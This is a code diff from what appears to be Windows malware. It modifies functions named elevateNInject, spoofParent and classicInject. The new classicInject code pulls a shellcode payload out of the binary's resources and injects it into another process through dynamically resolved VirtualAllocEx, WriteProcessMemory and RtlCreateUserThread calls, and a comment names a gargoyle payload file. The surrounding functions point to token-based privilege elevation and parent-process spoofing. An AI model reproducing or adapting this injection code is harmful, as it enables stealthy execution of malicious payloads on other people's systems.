@@ -315,7 +315,7 @@ BOOL executeSliv(HANDLE hToken) {
 
 HANDLE fatToke = NULL;
 
-BOOL elevateNInject(_In_ HANDLE parentProc) {
+BOOL elevateNInject( HANDLE parentProc,HANDLE debugPp) {
 
 	SIZE_T size = 0x30;
 
@@ -434,7 +434,9 @@ BOOL elevateNInject(_In_ HANDLE parentProc) {
 
 
 	HANDLE hProc = pi.hProcess;
-	classicInject(hProc);
+	//classicInject(hProc, 106);
+	classicInject(hProc, 105);
+
 
 	//spoofParent(hProc);
 
@@ -444,6 +446,10 @@ BOOL elevateNInject(_In_ HANDLE parentProc) {
 
 	CloseHandle(pi.hThread);
 	CloseHandle(pi.hProcess);
+	NtClose(parentProc);
+	parentProc = NULL;
+	NtClose(debugPp);
+	debugPp = NULL;
 
 	//if (si.lpAttributeList)
 	//	DeleteProcThreadAttributeList(si.lpAttributeList); //dumb empty routine
@@ -506,7 +512,7 @@ BOOL spoofParent(HANDLE parent) {
 		return FALSE;
 	}
 
-	classicInject(pi.hProcess);
+	//classicInject(pi.hProcess, hModule);
 
 	//if (si.lpAttributeList)
 	//	DeleteProcThreadAttributeList(si.lpAttributeList); //dumb empty routine
@@ -515,19 +521,51 @@ BOOL spoofParent(HANDLE parent) {
 }
 
 
-BOOL classicInject(HANDLE hProc) {
+BOOL classicInject(HANDLE hProc,int resource) {
 
-
+	//"C:\Users\d\MIDNIGHTTRAIN\Bin\gargoyle_x64.bin"
 	LPVOID pRemoteCode = NULL;
 	HANDLE hThread = NULL;
 	BOOL bStatus = FALSE;
+
+	
+
+	void* exec_mem;
+	BOOL rv;
+	HANDLE th;
+	DWORD oldprotect = 0;
+	HGLOBAL resHandle = NULL;
+	HRSRC res;
+
+	unsigned char* payload1;
+	unsigned int payload1_len;
+
+	//// Extract payload from resources section
+	//res = FindResource(NULL, MAKEINTRESOURCE(105), L"BIN");
+	//resHandle = LoadResource(NULL, res);
+	//payload1 = (unsigned char*)LockResource(resHandle);
+
+	//payload1_len = SizeofResource(NULL, res);
+
+	res = FindResource(g_hInstance, MAKEINTRESOURCE(resource), L"BIN"); // substitute RESOURCE_ID and RESOURCE_TYPE.
+
+
+
+	resHandle = LoadResource(g_hInstance, res);
+	payload1 = (unsigned char*)LockResource(resHandle);
+
+	payload1_len = SizeofResource(g_hInstance, res);
+
+
+
+
 
 	pVirtualAllocEx = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "VirtualAllocEx");
 	pWriteProcessMemory = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "WriteProcessMemory");
 	pRtlCreateUserThread = GetProcAddress(GetModuleHandle(L"Ntdll.dll"), "RtlCreateUserThread");
 
-	pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
-	if (!pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL)) {
+	pRemoteCode = pVirtualAllocEx(hProc, NULL, payload1_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+	if (!pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload1, (SIZE_T)payload1_len, (SIZE_T*)NULL)) {
 		return FALSE;
 	}
 
